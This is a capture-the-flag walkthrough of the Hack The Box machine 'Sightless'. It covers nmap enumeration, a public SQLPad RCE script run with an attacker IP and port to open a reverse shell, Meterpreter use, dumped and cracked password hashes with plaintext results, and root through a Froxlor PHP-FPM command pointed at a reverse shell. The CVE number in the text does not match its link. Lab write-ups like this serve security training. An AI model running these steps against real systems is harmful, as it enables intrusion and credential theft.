## Hackthebox Sightless Writeup 10.129.21.27

### Nmap enumeration

	Nmap scan report for 10.129.21.27
	Host is up, received reset ttl 63 (0.053s latency).
	Scanned at 2024-09-22 20:12:21 CDT for 71s

	PORT   STATE SERVICE REASON         VERSION
	21/tcp open  ftp     syn-ack ttl 63
	| fingerprint-strings: 
	|   GenericLines: 
	|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.21.27]
	|     Invalid command: try being more creative
	|_    Invalid command: try being more creative
	22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoivagBalUNqQKPAE2WFpkFMj+vKwO9D3RiUUxsnkBNKXp5ql1R+kvjG89Iknc24EDKuRWDzEivKXYrZJE9fxg=
	|   256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu
	80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-title: Did not follow redirect to **http://sightless.htb/**
	|_http-server-header: nginx/1.18.0 (Ubuntu)
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port21-TCP:V=7.94SVN%I=7%D=9/22%Time=66F0C080%P=aarch64-unknown-linux-g
	SF:nu%r(GenericLines,A1,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20F
	SF:TP\x20Server\)\x20\[::ffff:10\.129\.21\.27\]\r\n500\x20Invalid\x20comma
	SF:nd:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x
	SF:20try\x20being\x20more\x20creative\r\n");
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
	Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.0 (96%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 5.0 - 5.5 (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
	No exact OS matches for host (test conditions non-ideal).
	TCP/IP fingerprint:
	SCAN(V=7.94SVN%E=4%D=9/22%OT=21%CT=%CU=31167%PV=Y%DS=2%DC=T%G=N%TM=66F0C0BC%P=aarch64-unknown-linux-gnu)
	SEQ(SP=FC%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)
	SEQ(SP=FE%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=C)
	OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)
	WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
	ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)
	T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
	T2(R=N)
	T3(R=N)
	T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
	T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
	T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
	T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
	U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
	IE(R=Y%DFI=N%T=40%CD=S)
	
From out nmap scan we can see the IP 10.129.21.27 is trying to redirect to http://sightless.htb on port 80. Let's add this to our /etc/hosts file and enumerate the web site on port 80. 

### Adding IP to /etc/hosts

![Hosts](/Sightless/images/hosts-file.png) 

Viewing the source code of sightless landing page we can find a sqlpad subdomain. Let's also add this to our /etc/hosts file and continue with enumeration. Sightless appears to be a development software from reading the home page.

Sightless is also an Enginx Server running on Ubuntu OS. Therefore, php, and html extensions will most likely be common.


![sql subdomain](/Hack_The_Box/Sightless/images/sql-subdomain.png) 

The sqlpad subdomain looks like it might let up execute and run SQL queries. Lets try loading and running xp_cmdshell.

![sqlpad](/Hack_The_Box/Sightless/images/sqlpad.png) 


Enumerating the sqlpad domain with dirsearch returns a manifest.json file that we can view.

![dirsearch](/Hack_The_Box/Sightless/images/dirsearch.png) 

![dirsearch](/Hack_The_Box/Sightless/images/directory-access.png) 

I'm going to see if I can run curl against the url to view the contents.

The manifests file doesn't return any information but clicking the 3 dots on the web page we can see that this is version 6.10 and searching SQLPad exploits we do see one for RCE on github catagorized as [CVE-2022-9444](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944). 


After downloading the github repo to my host machine I run the exploit script without and ags and I can see that it accepts the following arguments:

1. root_url
2. attacker_ip
3. attacker_port

I'm going to start a netcat listener on port 4444

Next I will run on my kali host:
	$ python3 exploit.py http://sqlpad.sightless.htb 10.10.14.X 4444


And we get an initial shell on the machine, it appears we are in a docker container.

![Shell](/Hack_The_Box/Sightless/images/shell.png) 


### Exploitation

Viewing the sqlite db file in /var/lib/sqlpad we can see 2 user accounts.

1. john@sightless.htb
2. admin@sightless.htb

Python isn't installed in the docker container so I'm going to create a metasploit payload so I can transer files.

![Metasploit](/Hack_The_Box/Sightless/images/met-payload.png) 

And transfer the payload to the target.

![Metasploit](/Hack_The_Box/Sightless/images/transfer.png) 


Set up the Metasploit multi / handler

![Metasploit](/Hack_The_Box/Sightless/images/transfer.png) 

After executing my payload on the target I get a meterpreter shell on my attack host.


![Metasploit](/Hack_The_Box/Sightless/images/meterpreter.png) 


I pulled this hash out of the sqlprod db file. I will try to crack it.

$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n*********

I was able to crack the hash with JtR. It appears to be a hash for john. Let's see if I can SSH into the main box and get out of this docker shell.

![JtR](/Hack_The_Box/Sightless/images/hash-crack.png) 

Looking at the /etc/passwrd file we see 3 users with shell access. Root, node, and michael.


![/etc/passwrd](/Hack_The_Box/Sightless/images/passwrd.png) 

Shadow File

![/etc/shadow](/Hack_The_Box/Sightless/images/shadow.png) 

Using unshadow I was able to get root and Michael's hashes. I will now try and crack them. 

$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.

$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/

John successfully cracked both hashes. Let's see if we can login via ssh.

Hashes:

blindside
insaneclownposse


![JtR](/Hack_The_Box/Sightless/images/john.png) 

One of the hashes works to login via SSH to Michael account.

![SSH](/Hack_The_Box/Sightless/images/ssh.png) 

Sightless internal netstat ports listening

127.0.0.1:33060
127::3000
127.0.0.1:3306
127.0.0.1:8080


![Network](/Hack_The_Box/Sightless/images/netstat.png) 
![Network](/Hack_The_Box/Sightless/images/netstat2.png) 




### Privilege Escalation

Searching linpeas output Chrome is running -remote debugging-port=0. This appears exploitable.

I also noticed an additional subdomain. admin when I was parsing linpeas output. I'll add it to my /etc/hosts file. 

![Priv Esc](/Hack_The_Box/Sightless/images/chrome.png) 


I next locally port forwarded all the listening ports on the target to my attack machine.


![SSH Local](/Hack_The_Box/Sightless/images/ssh-local.png) 

Now within firefox I will add them all in.

chrome://inspect/#devices


After adding all the ports and capturing the requests in chrome debugger we find that the login is the following credentials.

Username: admin
Password: ForlorfroxAdmin

![Froxlar login](/Hack_The_Box/Sightless/images/login.png) 


For root I copied a php reverse shell to /tmp on michael's ssh session. 

From froxlor I will now create a new php version and have it set to the command /tmp/shell.php and save. I will then deactive and active the service to trigger my shell and get root access. Don't forget to have a listener on your attack machine.


![tmp shell](/Hack_The_Box/Sightless/images/php-shell.png) 


![Froxlar](/Hack_The_Box/Sightless/images/change-version.png) 

![Froxlar](/Hack_The_Box/Sightless/images/disable.png) 

![Froxlar](/Hack_The_Box/Sightless/images/enable.png) 

We should now get a call back with a root shell on our attack machine.

![Root](/Hack_The_Box/Sightless/images/root.png) 

![Root](/Hack_The_Box/Sightless/images/cleanup.png) 
